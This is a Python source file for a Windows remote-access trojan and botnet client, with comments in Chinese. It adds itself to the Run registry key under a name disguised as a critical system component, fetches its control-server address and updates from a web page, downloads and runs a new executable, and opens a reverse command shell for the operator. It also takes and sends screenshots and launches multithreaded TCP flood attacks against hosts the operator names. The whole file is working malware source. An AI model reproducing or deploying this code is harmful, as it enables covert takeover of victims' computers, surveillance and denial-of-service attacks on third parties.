from getpass import getuser
import random
from subprocess import Popen, PIPE
from time import sleep
from socket import *
import os
from sys import argv
import win32api, win32con, pywintypes
from requests import get
from lxml import etree
from threading import Thread


# 服务端脚本
def get_version():
    try:
        url = "http://127.0.0.1:80/update_version/"
        html = get(url=url).text
        tree = etree.HTML(html)
        print(tree)
        ip = tree.xpath("/html/body/span[1]/text()")[0]
        port = tree.xpath("/html/body/span[2]/text()")[0]
        version = tree.xpath("/html/body/span[3]/text()")[0]
        return ip, port, version
    except:
        url = "http://127.0.0.1:80/update_version/"
        html = get(url=url).text
        tree = etree.HTML(html)
        ip = tree.xpath("/html/body/span[1]/text()")[0]
        port = tree.xpath("/html/body/span[2]/text()")[0]
        version = tree.xpath("/html/body/span[3]/text()")[0]
        return ip, port, version


def update_version(new_version):
    if new_version != "1.1.1.0":
        url = "http://127.0.0.1:80/static/client.exe"
        data = get(url).content
        with open('C:/Users/Public/Downloads/client1.exe', 'wb') as fp:
            fp.write(data)
        return "ok"
    else:
        pass


def AutoStart(path=argv[0].replace("/", "\\")):
    runpath = "Software\Microsoft\Windows\CurrentVersion\Run"
    hKey = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, runpath, 0, win32con.KEY_ALL_ACCESS)
    while True:
        try:
            if str(win32api.RegQueryValueEx(hKey, "系统关键组件")[0]) == path:
                done = True
                break
            else:
                win32api.RegDeleteValue(hKey, "系统关键组件")
                win32api.RegCloseKey(hKey)
                hKey = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER, runpath, 0, win32con.KEY_ALL_ACCESS)
                raise pywintypes.error
            done = True
            break
        except pywintypes.error:
            win32api.RegSetValueEx(hKey, "系统关键组件", 0, win32con.REG_SZ, path)
            done = True
    win32api.RegCloseKey(hKey)
    return done


def ddos(pack, t_ip, t_port):
    for i in range(int(pack)):
        byte = random._urandom(2048)
        s = socket(AF_INET, SOCK_STREAM)
        s.connect((t_ip, int(t_port)))
        s.send(byte)


def t_ddos(thread, pack, t_ip, t_port):
    for i in range(int(thread)):
        Thread(target=ddos, args=(pack, t_ip, t_port,)).start()


def connect(ip, port):
    client_socket = socket(AF_INET, SOCK_STREAM)
    client_socket.connect((ip, int(port)))
    return client_socket


def client_cmd(c):
    while True:
        user_cmd = c.recv(2048).decode('utf-8')
        print(user_cmd)
        if user_cmd == 'exit':
            break
        elif user_cmd.split(' ')[0] == 'cd':
            now_cmd = user_cmd.split(' ')[1]
            os.chdir(now_cmd)
            now_path = os.getcwd()
            c.send(now_path.encode('utf-8'))
        else:
            a = Popen(user_cmd, shell=True, stdin=PIPE, stdout=PIPE,
                      stderr=PIPE)
            a.stdin.close()
            result = a.stdout.read()
            c.send(' '.encode('utf-8') + result)
            a.stdout.close()


def screen_shoot():
    from pyautogui import screenshot
    filename = 'client.png'
    path = "C:\\Users\\Public\\Pictures\\"
    screenshot().save(path + filename)


def screen_send(client):
    path = "C:\\Users\\Public\\Pictures\\"
    a = f"{path}client.png"
    files = open(a, 'rb')
    while True:
        data = files.read(4024)
        if not data:
            Popen("del " + a, shell=True, stdin=PIPE,
                  stdout=PIPE,
                  stderr=PIPE)
            files.close()
            client.close()
            break
        client.send(data)


if __name__ == '__main__':
    AutoStart()
    while True:
        ip, port, version = get_version()
        a = update_version(version)
        if a == "ok":
            Popen("C:/Users/Public/Downloads/client1.exe", shell=True, stdin=PIPE,
                  stdout=PIPE,
                  stderr=PIPE)
            break
        else:
            try:
                client_socket = connect(ip, port)
                key = "freet"
                user_name = getuser()
                first_data = key + " " + user_name
                client_socket.send(first_data.encode('utf-8'))
                while True:
                    cmd = client_socket.recv(2048).decode('utf-8')
                    if cmd == 'shell':
                        client_socket.send('................进入shell................'.encode('utf-8'))
                        client_cmd(client_socket)
                    elif cmd == "screen shoot":
                        screen_shoot()
                        screen_send(client_socket)
                    elif cmd.split(' ')[0] == 'ddos':
                        data = user_name + "正在攻击"
                        client_socket.send(data.encode('utf-8'))
                        t_ip = cmd.split(' ')[1]
                        t_port = cmd.split(' ')[2]
                        pack = cmd.split(' ')[3]
                        thread = cmd.split(' ')[4]
                        t_ddos(thread=thread, t_ip=t_ip, t_port=t_port, pack=pack)
                    else:
                        client_socket.send('[-]发送命令失败'.encode('utf-8'))
            except Exception as e:
                sleep(10)
                continue
